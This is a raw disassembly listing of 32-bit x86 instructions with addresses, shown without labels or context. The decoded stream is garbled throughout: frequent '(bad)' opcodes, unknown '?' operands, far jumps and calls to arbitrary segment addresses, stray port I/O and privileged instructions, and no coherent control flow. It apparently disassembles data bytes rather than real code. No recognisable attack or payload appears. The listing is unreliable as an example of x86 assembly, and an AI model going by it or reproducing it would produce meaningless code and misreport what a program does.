  420541:	test   DWORD PTR [ebp+0x77],ebx
  420544:	loope  0x4205b5
  420546:	stos   DWORD PTR es:[edi],eax
  420547:	mov    eax,ds:0x4f27821c
  42054c:	sbb    esi,DWORD PTR [esi+0x4eeeddc2]
  420552:	into   
  420553:	xchg   DWORD PTR fs:[ebx],eax
  420556:	imul   esp,DWORD PTR [esi-0x1486764e],0x8c8075f8
  420560:	fs jmp 0x42059a
  420563:	sub    al,0x19
  420565:	stos   BYTE PTR es:[edi],al
  420566:	xchg   esp,eax
  420567:	mov    ebx,0x5e586c4a
  42056c:	xlat   BYTE PTR ds:[ebx]
  42056d:	mov    ebp,0xfec3ef64
  420572:	retf   0x2f86
  420575:	mov    al,ds:0xc69494c5
  42057a:	into   
  42057b:	dec    ebx
  42057c:	and    al,0x55
  42057e:	cmp    al,cl
  420580:	cwde   
  420581:	popa   
  420582:	jo     0x4205f9
  420584:	xchg   esi,eax
  420585:	out    dx,al
  420586:	fwait
  420587:	nop
  420588:	ds pop ds
  42058a:	and    BYTE PTR [esi-0x70],ch
  42058d:	js     0x42056a
  42058f:	mov    cl,0x5c
  420591:	fsub   DWORD PTR [edi-0x4c]
  420594:	imul   edx,DWORD PTR ds:0xd32f5b4c,0xffffffce
  42059b:	pop    es
  42059c:	imul   esi,DWORD PTR [esp+edx*1-0x50],0xa4c85569
  4205a4:	lea    edi,[esi-0x38738d6]
  4205aa:	addr16 inc edx
  4205ac:	pop    eax
  4205ad:	retf   0xd093
  4205b0:	fucomp st(6)
  4205b2:	pop    es
  4205b3:	in     al,0xcc
  4205b5:	out    0x30,al
  4205b7:	lods   eax,DWORD PTR ds:[esi]
  4205b8:	fs loope 0x4205ea
  4205bb:	addr16 fwait
  4205bd:	ins    DWORD PTR es:[edi],dx
  4205be:	jmp    0x15a3:0x52a2bb3f
  4205c5:	pop    esi
  4205c6:	jbe    0x420645
  4205c8:	push   ss
  4205c9:	fbstp  TBYTE PTR [edi+0x2c]
  4205cc:	gs inc esi
  4205ce:	cmp    BYTE PTR [ebp+0x4d588e00],bl
  4205d4:	or     eax,0x477bb61b
  4205d9:	pop    eax
  4205da:	add    ecx,eax
  4205dc:	adc    BYTE PTR ds:0x681cfd23,ch
  4205e2:	fwait
  4205e3:	jno    0x42057c
  4205e5:	hlt    
  4205e6:	or     al,0x2e
  4205e8:	mov    DWORD PTR [edi-0x148642ea],ecx
  4205ee:	dec    esp
  4205ef:	or     al,0x7f
  4205f1:	scas   al,BYTE PTR es:[edi]
  4205f2:	xacquire xchg DWORD PTR [eax+esi*1],ebp
  4205f6:	jmp    0xca8b:0xe44cf1bb
  4205fd:	jle    0x4205ce
  4205ff:	pusha  
  420600:	mul    DWORD PTR [eax-0xc5d8641]
  420606:	cld    
  420607:	cs cwde 
  420609:	mov    DWORD PTR [eax+edx*8+0x13a97e96],edx
	...
  420674:	test   BYTE PTR [eax-0x48],ch
  420677:	or     ah,bh
  420679:	fdiv   DWORD PTR [esp+ebp*8+0x78d500c5]
  420680:	repz mov edi,0x58f0abe3
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	jg     0x42061b
  42068e:	sub    eax,0x9aa3ad85
  420693:	lea    ebp,[esi-0x3b]
  420696:	lahf   
  420697:	js     0x420685
  420699:	push   edx
  42069a:	test   eax,0x621929c5
  42069f:	test   al,bl
  4206a1:	adc    al,0xc7
  4206a3:	mov    bl,0x5e
  4206a5:	sahf   
  4206a6:	call   0x934f:0xaad497af
  4206ad:	sbb    eax,0x502f062f
  4206b2:	dec    ebp
  4206b3:	adc    BYTE PTR [ecx-0x2f881700],ch
  4206b9:	push   ds
  4206ba:	sbb    al,BYTE PTR ds:0xd408b1c4
  4206c0:	clc    
  4206c1:	aas    
  4206c2:	mov    edx,edi
  4206c4:	and    dl,BYTE PTR [ebp+0x796f1c9c]
  4206ca:	mov    ch,0x9
  4206cc:	aam    0xd
  4206ce:	retf   0xe963
  4206d1:	scas   eax,DWORD PTR es:[edi]
  4206d2:	push   ds
  4206d3:	psubusb mm6,QWORD PTR [ebp+0x34]
  4206d7:	sub    al,BYTE PTR [edx+0x3c]
  4206da:	push   cs
  4206db:	xor    eax,eax
  4206dd:	sub    ch,BYTE PTR [ecx+0x327bac77]
  4206e3:	mov    eax,0xea36a79e
  4206e8:	cmp    BYTE PTR [ebx+ebp*4+0x6f],dh
  4206ec:	les    edx,FWORD PTR [ebp-0x3c]
  4206ef:	sbb    bh,BYTE PTR [ecx+0x1319596]
  4206f5:	pop    es
  4206f6:	jbe    0x42075a
  4206f8:	xlat   BYTE PTR ds:[ebx]
  4206f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206fa:	pop    ebp
  4206fb:	fldenv ds:0xe26d64ca
  420701:	aad    0x7e
  420703:	repz ret 
  420705:	sbb    eax,edi
  420707:	mov    dh,BYTE PTR [ebx+0x4b08753a]
  42070d:	sub    DWORD PTR [eax-0x49],esi
  420710:	mov    al,ch
  420712:	ds xchg esp,eax
  420714:	xlat   BYTE PTR ds:[ebx]
  420715:	and    eax,0xe0812fec
  42071a:	adc    ch,BYTE PTR [ebx]
  42071c:	shr    BYTE PTR [eax+0xa],0x35
  420720:	pop    edx
  420721:	popa   
  420722:	inc    esi
  420723:	ds cdq 
  420725:	xchg   edi,eax
  420726:	arpl   di,si
  420728:	jle    0x4206cf
  42072a:	mov    ds:0xc2d4bf6b,eax
  42072f:	sbb    al,0xd4
  420731:	(bad)  
  420732:	js     0x42075d
  420734:	cdq    
  420735:	pop    ebx
  420736:	lods   eax,DWORD PTR ds:[esi]
  420737:	in     eax,dx
  420738:	jbe    0x420762
  42073a:	daa    
  42073b:	(bad)  
  42073c:	mov    BYTE PTR ds:0x38babb44,ah
  420742:	adc    esp,DWORD PTR [esi-0x792014b0]
  420748:	leave  
  420749:	mov    bh,0xb1
  42074b:	repnz sub bp,WORD PTR fs:[esi+0x7e6da9ff]
  420754:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  420756:	arpl   WORD PTR [esi],ax
  420758:	mov    bh,BYTE PTR [ebx]
  42075a:	lods   eax,DWORD PTR ds:[esi]
  42075b:	xor    ebx,DWORD PTR [ebx+ecx*1-0x7]
  42075f:	jle    0x42070e
  420761:	aam    0x1e
  420763:	inc    ebp
  420764:	popa   
  420765:	loope  0x42071f
  420767:	cmp    BYTE PTR [ecx-0x59],al
  42076a:	(bad)  
  42076b:	retf   0x2541
  42076e:	dec    ebx
  42076f:	retf   
  420770:	pusha  
  420771:	adc    ebp,DWORD PTR [esi+0x11]
  420774:	mov    dl,0x97
  420776:	and    ecx,esp
  420778:	mov    edx,0x630fc559
  42077d:	add    DWORD PTR [edi-0x1a],ebx
  420780:	call   0x247c7e7f
  420785:	fsubr  st(0),st
  420787:	mov    esp,0x89c307e
  42078c:	add    eax,0x79022a
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	add    BYTE PTR [eax],al
  420802:	adc    bl,bh
  420804:	hlt    
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	aam    0xdc
  42080e:	sahf   
  42080f:	push   ss
  420810:	inc    esp
  420811:	inc    ecx
  420812:	(bad)  
  420813:	and    al,0xf5
  420815:	xchg   ebp,eax
  420816:	out    0xee,al
  420818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420819:	dec    edx
  42081a:	cli    
  42081b:	rcr    DWORD PTR [ecx],cl
  42081d:	adc    ebp,DWORD PTR [ebx+0x4bc3f49e]
  420823:	jb     0x420856
  420825:	mov    ebx,0x207bceb0
  42082a:	push   eax
  42082b:	xchg   esi,eax
  42082c:	lahf   
  42082d:	ret    
  42082e:	jae    0x4207cb
  420830:	shr    DWORD PTR [ecx+0x46],cl
  420833:	cmp    BYTE PTR [ebp-0x4],bh
  420836:	in     al,dx
  420837:	and    esi,0x3
  42083a:	ss ins DWORD PTR es:[edi],dx
  42083c:	add    DWORD PTR [edx+0xe],eax
  42083f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420840:	inc    esi
  420841:	arpl   cx,dx
  420843:	rol    DWORD PTR [ebp-0x3e],1
  420846:	test   al,0xa
  420848:	and    BYTE PTR [edi+0x7d8a3f6],0x7e
  42084f:	imul   esp,DWORD PTR [ebx*1-0x12659b13],0x3c3f8ee6
  42085a:	cdq    
  42085b:	in     al,0x7e
  42085d:	test   al,0x76
  42085f:	xchg   edx,ecx
  420861:	mov    dh,0x60
  420863:	popa   
  420864:	jmp    0x1c8a:0xae8a865e
  42086b:	dec    edi
  42086c:	inc    edi
  42086d:	pop    eax
  42086e:	mov    edx,edi
  420870:	test   DWORD PTR [edx],0x6b2308a1
  420876:	dec    edx
  420877:	ja     0x4208ec
  420879:	adc    eax,0x14c72ee4
  42087e:	cmc    
  42087f:	retf   
  420880:	xor    eax,0xf8b8bc4e
  420885:	mov    bl,0x70
  420887:	mov    al,BYTE PTR [ecx+0xb]
  42088a:	sti    
  42088b:	push   ecx
  42088c:	popf   
  42088d:	inc    esp
  42088e:	das    
  42088f:	mov    ch,0x97
  420891:	(bad)  
  420892:	neg    DWORD PTR [edx-0x7591fd57]
  420898:	or     ah,al
  42089a:	out    0x43,al
  42089c:	pop    ds
  42089d:	or     DWORD PTR [edi+0x11a8044d],edi
  4208a3:	and    al,0xaf
  4208a5:	mov    BYTE PTR [edx-0x3b],al
  4208a8:	pop    ebx
  4208a9:	(bad)  
  4208aa:	fld    QWORD PTR [ebx+0x45d4155f]
  4208b0:	or     ch,bl
  4208b2:	sbb    ecx,DWORD PTR [ebp+0x2c7865e8]
  4208b8:	addr16 mov eax,0xdfe9c206
  4208be:	inc    ecx
  4208bf:	js     0x42089d
  4208c1:	jecxz  0x4208df
  4208c3:	cmp    eax,0x8e00dd16
  4208c8:	inc    ecx
  4208c9:	xchg   edx,eax
  4208ca:	(bad)
  4208cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208ce:	cmp    eax,0x94fddb2d
  4208d3:	scas   al,BYTE PTR es:[edi]
  4208d4:	clc    
  4208d5:	inc    eax
  4208d6:	adc    DWORD PTR [edi-0x54],esp
  4208d9:	jb     0x420943
  4208db:	push   cs
  4208dc:	mov    esp,0x1f13c5ab
  4208e1:	add    ecx,esi
  4208e3:	imul   ebx,DWORD PTR [edi+edi*2],0xffffffea
  4208e7:	into   
  4208e8:	jae    0x420922
  4208ea:	xchg   edi,eax
  4208eb:	das    
  4208ec:	les    eax,FWORD PTR ds:0x9d62df3f
  4208f2:	cli    
  4208f3:	adc    al,0xba
  4208f5:	xor    BYTE PTR [esp+ebx*4-0x70677a25],dh
  4208fc:	xor    edx,ebx
  4208fe:	and    edx,ebp
  420900:	gs pop esi
  420902:	or     BYTE PTR [edi+0x2e],0xe0
  420906:	scas   al,BYTE PTR es:[edi]
  420907:	ret    0xe762
  42090a:	mov    al,ah
  42090c:	int3   
  42090d:	or     edi,ebx
  42090f:	inc    eax
	...
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x98
  420981:	imul   edi,DWORD PTR [ebx+0x15af8a2],0x10400
  42098b:	add    BYTE PTR [esi-0x5c3397fd],dl
  420991:	out    0xc8,al
  420993:	push   es
  420994:	jnp    0x4209fa
  420996:	xor    eax,DWORD PTR [ecx]
  420998:	xlat   BYTE PTR ds:[ebx]
  420999:	add    esp,DWORD PTR [ebx]
  42099b:	sbb    DWORD PTR [edx+0x631a21cc],0x3e
  4209a2:	and    dl,ah
  4209a4:	sahf   
  4209a5:	adc    al,0x82
  4209a7:	or     BYTE PTR [edx-0x7],al
  4209aa:	xchg   DWORD PTR [ecx+0x4f],ebp
  4209ad:	push   esp
  4209ae:	pop    ebp
  4209af:	out    dx,eax
  4209b0:	stos   DWORD PTR es:[edi],eax
  4209b1:	pop    esi
  4209b2:	and    al,BYTE PTR [eax-0x16]
  4209b5:	cmp    DWORD PTR [ebp-0x2b2dd1c7],esp
  4209bb:	and    BYTE PTR fs:[ebx],ch
  4209be:	fistp  WORD PTR [ebp+0x3f]
  4209c1:	pop    eax
  4209c2:	mov    edi,0x7531ea6e
  4209c7:	jp     0x42094d
  4209c9:	int3   
  4209ca:	call   0x23aafcba
  4209cf:	repz jmp 0x420a17
  4209d2:	and    ah,BYTE PTR [ebp+0x2d7cf96b]
  4209d8:	lock xchg esi,eax
  4209da:	cli    
  4209db:	add    BYTE PTR [ebx-0x80],bh
  4209de:	and    al,0x22
  4209e0:	inc    edx
  4209e1:	adc    DWORD PTR [esi-0x1c],edi
  4209e4:	and    eax,0x8501d15e
  4209e9:	in     al,dx
  4209ea:	push   ebp
  4209eb:	inc    ebp
  4209ec:	jp     0x420a48
  4209ee:	xchg   DWORD PTR ds:0x5832063e,ecx
  4209f4:	xchg   esp,eax
  4209f5:	mov    ds:0x510bcd96,al
  4209fa:	inc    esi
  4209fb:	add    BYTE PTR [edx],cl
  4209fd:	push   ebx
  4209fe:	and    DWORD PTR [eax-0x4c060ad8],esp
  420a04:	add    dh,bl
  420a06:	cdq    
  420a07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a08:	mov    ?,WORD PTR [edi+0x139e1b03]
  420a0e:	fcom   QWORD PTR [edx+0x6bc3e658]
  420a14:	pushf  
  420a15:	(bad)  
  420a16:	(bad)  [edi+0x4296975a]
  420a1c:	pop    ecx
  420a1d:	pop    edi
  420a1e:	sbb    al,0x59
  420a20:	fimul  DWORD PTR [ebx]
  420a22:	imul   ebp,DWORD PTR [edi],0x7823d862
  420a28:	hlt    
  420a29:	jb     0x420a73
  420a2b:	retf   
  420a2c:	mov    ds:0xa0b237ab,eax
  420a31:	std    
  420a32:	lods   eax,DWORD PTR ds:[esi]
  420a33:	sub    edi,0x32
  420a36:	xchg   edx,eax
  420a37:	inc    edx
  420a38:	pop    ebp
  420a39:	lods   al,BYTE PTR ds:[esi]
  420a3a:	loope  0x4209d2
  420a3c:	jp     0x420a09
  420a3e:	aam    0x9
  420a40:	cs jns 0x420a25
  420a43:	mov    es,WORD PTR fs:[ecx]
  420a46:	and    bl,bl
  420a48:	mov    ebx,0x91ffd8be
  420a4d:	mov    eax,esi
  420a4f:	xor    al,0xd6
  420a51:	xor    DWORD PTR [edx-0x450c20e7],0xfffffff4
  420a58:	dec    ebp
  420a59:	daa    
  420a5a:	pop    esp
  420a5b:	pop    esp
  420a5c:	adc    al,0xba
  420a5e:	retf   
  420a5f:	pop    esi
  420a60:	mov    ah,0x8a
  420a62:	pop    ebp
  420a63:	cli    
  420a64:	sbb    al,0x14
  420a66:	int3   
  420a67:	push   ds
  420a68:	ins    DWORD PTR es:[edi],dx
  420a69:	(bad)  
  420a6a:	sahf   
  420a6b:	fwait
  420a6c:	pop    ebp
  420a6d:	adc    ebp,DWORD PTR [edx-0x24]
  420a70:	mov    BYTE PTR [edi],bl
  420a72:	mov    edx,0xe757617c
  420a77:	call   0x40b39f1e
  420a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a7d:	dec    ebx
  420a7e:	mov    ch,0x81
  420a80:	dec    esi
  420a81:	mov    ah,0xba
  420a83:	sub    BYTE PTR [ebx],bh
  420a85:	dec    eax
  420a86:	or     eax,0xdc127c7f
  420a8b:	aad    0x6a
  420a8d:	push   edx
  420a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a8f:	stos   BYTE PTR es:[edi],al
	...
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	jle    0x420b23
  420b02:	add    BYTE PTR [ebp+0x15bfc],0x4
  420b09:	add    DWORD PTR [eax],eax
  420b0b:	add    BYTE PTR [esi+0x796b48db],ah
  420b11:	(bad)  
  420b12:	push   ebx
  420b13:	dec    ebp
  420b14:	gs push ss
  420b16:	popa   
  420b17:	imul   BYTE PTR [ecx+0x61]
  420b1a:	rcr    BYTE PTR [ebp+0x60289fbd],1
  420b20:	sub    dh,dl
  420b22:	jg     0x420b61
  420b24:	into   
  420b25:	(bad)  
  420b26:	xor    DWORD PTR [edi*4+0x2797e678],esp
  420b2d:	cmp    ecx,DWORD PTR [esi-0x35]
  420b30:	in     eax,dx
  420b31:	push   ss
  420b32:	loop   0x420ae5
  420b34:	ret    
  420b35:	ins    BYTE PTR es:[edi],dx
  420b36:	lahf   
  420b37:	sbb    BYTE PTR [eax-0x75],ch
  420b3a:	pop    eax
  420b3b:	xchg   esp,eax
  420b3c:	inc    ebx
  420b3d:	sbb    al,0xd3
  420b3f:	ret    0x4691
  420b42:	cmp    eax,ebx
  420b44:	mov    eax,0x2bc153fc
  420b49:	xchg   esp,eax
  420b4a:	jecxz  0x420b82
  420b4c:	and    DWORD PTR [edx-0x25d83657],ebp
  420b52:	mov    ebx,0x6f447786
  420b57:	dec    eax
  420b58:	mov    esi,DWORD PTR [edx]
  420b5a:	add    al,0x84
  420b5c:	popf   
  420b5d:	xchg   esi,eax
  420b5e:	ror    ah,0x6b
  420b61:	popf   
  420b62:	sub    al,0xc
  420b64:	arpl   WORD PTR [ecx-0x1f],cx
  420b67:	inc    edi
  420b68:	mov    edi,0xd5941b78
  420b6d:	push   cs
  420b6e:	sti    
  420b6f:	mov    dh,0xdb
  420b71:	xchg   edx,eax
  420b72:	jbe    0x420bc4
  420b74:	xchg   ebx,eax
  420b75:	pop    ebp
  420b76:	xchg   ebx,eax
  420b77:	sbb    DWORD PTR [edi+0x2e],0x1ecfea71
  420b7e:	lods   al,BYTE PTR ds:[esi]
  420b7f:	sub    ah,al
  420b81:	fdivr  QWORD PTR [edx]
  420b83:	push   es
  420b84:	scas   al,BYTE PTR es:[edi]
  420b85:	jne    0x420bff
  420b87:	xor    edx,DWORD PTR [esi+esi*4-0x4308f7e3]
  420b8e:	and    edi,DWORD PTR [ebx+0x67]
  420b91:	cmp    DWORD PTR [edx-0x10],0xffffffc4
  420b95:	xchg   edi,eax
  420b96:	int3   
  420b97:	aaa    
  420b98:	mov    ecx,0x4d3c7460
  420b9d:	pusha  
  420b9e:	mov    WORD PTR [esi+ebp*4],?
  420ba1:	aad    0x3d
  420ba3:	fcomi  st,st(0)
  420ba5:	in     al,dx
  420ba6:	sub    bh,BYTE PTR cs:[eax+0x71620104]
  420bad:	sti    
  420bae:	clc    
  420baf:	addr16 out dx,eax
  420bb1:	push   eax
  420bb2:	das    
  420bb3:	cmp    esi,eax
  420bb5:	imul   ebx,DWORD PTR [edi],0xa499e657
  420bbb:	push   ebx
  420bbc:	mov    BYTE PTR [edi+0x39],dh
  420bbf:	pop    edx
  420bc0:	and    eax,0x1d133093
  420bc5:	sub    eax,0xe550d22a
  420bcb:	sar    DWORD PTR [edi-0x36],0x71
  420bcf:	mov    ch,0xd2
  420bd1:	dec    ebx
  420bd2:	mov    bh,0x87
  420bd4:	push   es
  420bd5:	test   eax,0xe2fa57e1
  420bda:	shl    DWORD PTR [ecx+0x3f9779df],cl
  420be0:	das    
  420be1:	sub    edi,DWORD PTR [ecx+0x343a635a]
  420be7:	cwde   
  420be8:	mov    bl,0x87
  420bea:	or     ah,ah
  420bec:	in     eax,dx
  420bed:	or     ebp,0xbdf4e854
  420bf3:	mov    ds:0x3e35b126,al
  420bf9:	xor    al,0x3e
  420bfb:	jmp    0xd23fcd4e
  420c00:	jl     0x420c55
  420c02:	mov    ch,0xc3
  420c04:	aas    
  420c05:	mov    ch,0xe
  420c07:	dec    ebp
  420c08:	and    esp,0x59
  420c0b:	leave  
  420c0c:	icebp  
  420c0d:	scas   eax,DWORD PTR es:[edi]
  420c0e:	test   DWORD PTR [edx+0x0],esi
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	mov    ah,0x19
  420c82:	mov    esi,esp
  420c84:	add    BYTE PTR [ebp+0x1],bl
  420c87:	add    BYTE PTR [ecx+eax*1],al
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	sub    BYTE PTR [edx-0x54824324],bh
  420c92:	in     al,0x7b
  420c94:	sub    al,0x10
  420c96:	jne    0x420c4d
  420c98:	sub    eax,0xf41239b3
  420c9d:	test   BYTE PTR [eax+ecx*8-0x49],ah
  420ca1:	jae    0x420cc3
  420ca3:	inc    edx
  420ca4:	ins    DWORD PTR es:[edi],dx
  420ca5:	jmp    0x725a:0xae8092e1
  420cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cad:	sbb    bh,BYTE PTR ds:0x54ab3781
  420cb3:	pop    edi
  420cb4:	out    0x53,al
  420cb6:	adc    DWORD PTR [edx+0x2cf490a4],ebp
  420cbc:	test   bl,ch
  420cbe:	sub    ch,BYTE PTR [ebx]
  420cc0:	jns    0x420c8d
  420cc2:	sub    DWORD PTR [edx-0x5d],ebx
  420cc5:	jb     0x420d11
  420cc7:	or     DWORD PTR [ebx+0x5a220e06],esp
  420ccd:	jg     0x420c8f
  420ccf:	je     0x420d42
  420cd1:	push   cs
  420cd2:	unpcklps xmm2,xmm4
  420cd5:	mov    ah,BYTE PTR [edi-0x8]
  420cd8:	ret    
  420cd9:	lods   al,BYTE PTR ds:[esi]
  420cda:	out    dx,al
  420cdb:	push   ebp
  420cdc:	adc    DWORD PTR [ebx+0x19],ecx
  420cdf:	cmp    ebp,ebp
  420ce1:	rcl    BYTE PTR [esi-0x7dffe902],0x8d
  420ce8:	push   edx
  420ce9:	out    0x6c,al
  420ceb:	xor    esp,DWORD PTR [esi]
  420ced:	into   
  420cee:	add    ecx,DWORD PTR ds:0xa12b6207
  420cf4:	sub    ah,BYTE PTR [ecx]
  420cf6:	add    DWORD PTR [eax+0x7b],esp
  420cf9:	mov    BYTE PTR [eax-0x28],0xc
  420cfd:	or     ecx,0xc980b9ef
  420d03:	dec    edx
  420d04:	jge    0x420d75
  420d06:	ret    
  420d07:	pop    ebx
  420d08:	push   0x1
  420d0a:	pusha  
  420d0b:	mov    edx,0x30865019
  420d10:	rol    DWORD PTR [ebx+ebx*8+0x6a],0x62
  420d15:	pop    ds
  420d16:	xchg   edi,eax
  420d17:	ret    0x31cf
  420d1a:	fwait
  420d1b:	jns    0x420d98
  420d1d:	cmp    DWORD PTR [ecx+0x1b],ebx
  420d20:	inc    esi
  420d21:	stos   BYTE PTR es:[edi],al
  420d22:	sahf   
  420d23:	retf   
  420d24:	out    dx,al
  420d25:	jns    0x420ce8
  420d27:	dec    edx
  420d28:	xor    bl,BYTE PTR [edi-0x9f9d55e]
  420d2e:	fldenv [eax+0x3abda30d]
  420d34:	jecxz  0x420ce7
  420d36:	aaa    
  420d37:	sbb    BYTE PTR ds:0x4cb5bf53,dh
  420d3d:	or     eax,DWORD PTR [edi-0x7d]
  420d40:	mov    ecx,0x89590616
  420d45:	sub    al,0x61
  420d47:	mov    ds:0x5ee0d4e9,eax
  420d4c:	sbb    eax,0x49b85fdb
  420d51:	(bad)  
  420d53:	and    dh,bl
  420d55:	daa    
  420d56:	inc    ebx
  420d57:	sub    al,0xde
  420d59:	(bad)  
  420d5a:	mov    ch,0x29
  420d5c:	mov    ecx,DWORD PTR [ecx]
  420d5e:	add    eax,0x69cdacf4
  420d63:	xor    eax,0xf640d065
  420d68:	retf   0x73d0
  420d6b:	outs   dx,BYTE PTR ds:[esi]
  420d6c:	mov    ebx,DWORD PTR [esi+0x6f8557f]
  420d72:	xor    DWORD PTR [esi-0x7b],ebp
  420d75:	xchg   ebp,eax
  420d76:	sub    al,0xa3
  420d78:	inc    esp
  420d79:	pop    ds
  420d7a:	dec    eax
  420d7b:	ficom  WORD PTR [edx-0x4e]
  420d7e:	xor    BYTE PTR [eax*8-0x5f23977c],0x20
  420d86:	xchg   edi,eax
  420d87:	sub    BYTE PTR [eax-0x15e1c603],0xa0
  420d8e:	adc    al,0x86
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xecb2ca5d
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	outs   dx,DWORD PTR ds:[esi]
  420e0d:	mov    eax,0x2f3d1864
  420e12:	or     DWORD PTR [ebx],ecx
  420e14:	(bad)  
  420e15:	popf   
  420e16:	dec    ebp
  420e17:	shl    BYTE PTR [edx-0x26545410],0x1f
  420e1e:	inc    ecx
  420e1f:	mov    ch,0xbc
  420e21:	pushf  
  420e22:	lock add al,0x19
  420e25:	ret    
  420e26:	je     0x420df0
  420e28:	jmp    0x13a7:0x5fc29958
  420e2f:	std    
  420e30:	cld    
  420e31:	jle    0x420e7b
  420e33:	mov    dl,ch
  420e35:	xchg   edx,eax
  420e36:	mov    ch,0x48
  420e38:	dec    edi
  420e39:	pop    ebp
  420e3a:	pop    ebp
  420e3b:	imul   ebx,DWORD PTR [ebx-0x43],0xffffffe2
  420e3f:	fwait
  420e40:	mov    DWORD PTR [eax-0x67acb6d7],eax
  420e46:	shl    DWORD PTR [esi+0x2bf701a6],cl
  420e4c:	sbb    eax,0x396c3174
  420e51:	cli    
  420e52:	adc    dh,BYTE PTR [ebp-0x7d778c7b]
  420e58:	gs and al,0x96
  420e5b:	add    DWORD PTR [ecx+ebp*2],ecx
  420e5e:	push   es
  420e5f:	loopne 0x420e05
  420e61:	aas    
  420e62:	out    dx,eax
  420e63:	fbstp  TBYTE PTR [ebp-0x63765974]
  420e69:	in     eax,dx
  420e6a:	addr16 xor eax,0x2199ce03
  420e70:	int    0xad
  420e72:	dec    ecx
  420e73:	pop    ecx
  420e74:	arpl   dx,di
  420e76:	inc    esp
  420e77:	shl    DWORD PTR [ecx+0x18e04da9],1
  420e7d:	shl    BYTE PTR [ecx+0x12519f89],1
  420e83:	stos   BYTE PTR es:[edi],al
  420e84:	fs sahf 
  420e86:	fwait
  420e87:	mov    ds:0xdf9314aa,al
  420e8c:	inc    eax
  420e8d:	push   ss
  420e8e:	add    cl,BYTE PTR [esi]
  420e90:	emms   
  420e92:	mov    esi,0x487d1128
  420e97:	cmp    ecx,DWORD PTR [edx+0x5c]
  420e9a:	xchg   ebp,eax
  420e9b:	sti    
  420e9c:	ja     0x420ed8
  420e9e:	mov    edi,0x9967019a
  420ea3:	int3   
  420ea4:	adc    DWORD PTR [edx+edx*8],eax
  420ea7:	sub    al,0x1c
  420ea9:	push   ss
  420eaa:	dec    edi
  420eab:	adc    bh,ah
  420ead:	push   esp
  420eae:	retf   0x51d7
  420eb1:	call   0xb032cace
  420eb6:	sub    ah,BYTE PTR [bp+si-0x2d]
  420eba:	xchg   esi,eax
  420ebb:	sub    esp,DWORD PTR [ebp+0xd24702d]
  420ec1:	out    0x71,eax
  420ec3:	cwde   
  420ec4:	cwde   
  420ec5:	test   al,0xb3
  420ec7:	in     eax,0x3
  420ec9:	jb     0x420e9c
  420ecb:	hlt    
  420ecc:	xchg   ebp,eax
  420ecd:	jnp    0x420f2b
  420ecf:	xchg   ecx,eax
  420ed0:	and    DWORD PTR [esi-0x35],ecx
  420ed3:	pop    ebp
  420ed4:	and    DWORD PTR [esp+ecx*2+0x33884acb],edx
  420edb:	push   ebx
  420edc:	repnz pop eax
  420ede:	hlt    
  420edf:	test   eax,0x2c4b872b
  420ee4:	clc    
  420ee5:	repnz xor edi,DWORD PTR [esi+0x623e7be6]
  420eec:	xor    DWORD PTR [eax-0x520877e8],ebp
  420ef2:	cmp    cl,dh
  420ef4:	daa    
  420ef5:	fistp  WORD PTR [esi-0x49f7cd13]
  420efc:	xchg   edi,eax
  420efd:	int3   
  420efe:	call   0xb707:0xd0c56c63
  420f05:	mov    ds:0x5765d5c0,eax
  420f0a:	mov    bh,0x68
  420f0c:	fsubr  st(2),st
  420f0e:	mov    BYTE PTR [edx+0x0],dl
	...
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x399ea8a1]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	leave  
  420f8d:	jle    0x420f82
  420f8f:	mov    ds:0xae8a595d,eax
  420f94:	pop    ds
  420f95:	in     eax,0x2b
  420f97:	xchg   edx,eax
  420f98:	push   ss
  420f99:	or     eax,0x10f8724e
  420f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f9f:	std    
  420fa0:	enter  0xc7fe,0x89
  420fa4:	adc    eax,0x10
  420fa7:	inc    edi
  420fa8:	and    DWORD PTR [ebp+0x5de81796],esp
  420fae:	add    al,0xd9
  420fb0:	ds je  0x420fd1
  420fb3:	imul   esp,DWORD PTR [edi+0x5023a501],0x58
  420fba:	pop    ds
  420fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fbc:	xchg   esi,eax
  420fbd:	or     BYTE PTR [edi-0x14],ah
  420fc0:	inc    esp
  420fc1:	iret   
